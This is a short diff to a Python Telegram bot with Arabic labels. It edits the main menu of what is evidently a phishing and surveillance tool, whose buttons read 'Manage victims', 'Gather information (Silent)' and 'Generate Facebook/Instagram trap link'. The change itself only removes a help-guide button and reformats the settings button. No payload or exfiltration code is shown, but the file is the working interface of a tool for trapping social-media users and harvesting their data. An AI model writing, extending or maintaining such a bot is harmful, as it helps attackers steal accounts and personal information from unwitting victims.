@@ -708,7 +708,7 @@ def build_tool_confirm_keyboard(tool, can_proceed=True):
 # [8] ★★★ الواجهة الرئيسية النظيفة ★★★
 # ============================================================
 def build_main_menu_keyboard(user_id):
-    """القائمة الرئيسية — نظيفة بدون أسعار"""
+    """القائمة الرئيسية — نظيفة بدون شرح البوت"""
     m = InlineKeyboardMarkup()
 
     m.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
@@ -719,20 +719,14 @@ def build_main_menu_keyboard(user_id):
     m.add(InlineKeyboardButton("🎯 جمع المعلومات (Silent)", callback_data="gen_silent"))
     m.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
     m.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
-    m.add(InlineKeyboardButton("📖 شرح البوت", callback_data="help_guide"))
 
-    # ─── زر الإعدادات ⚙️ ───
-    m.add(InlineKeyboardButton(
-        "⚙️ الإعدادات",
-        callback_data="settings_menu"
-    ))
+    # ⚙️ الإعدادات فقط (بدون help_guide)
+    m.add(InlineKeyboardButton("⚙️ الإعدادات", callback_data="settings_menu"))
 
     if is_admin(user_id):
         m.add(InlineKeyboardButton("👑 لوحة تحكم الأدمن", callback_data="admin_panel"))
 
     return m
-
-
 # ============================================================
 # [9] ★★★ لوحة الإعدادات ⚙️ ★★★
 # ============================================================
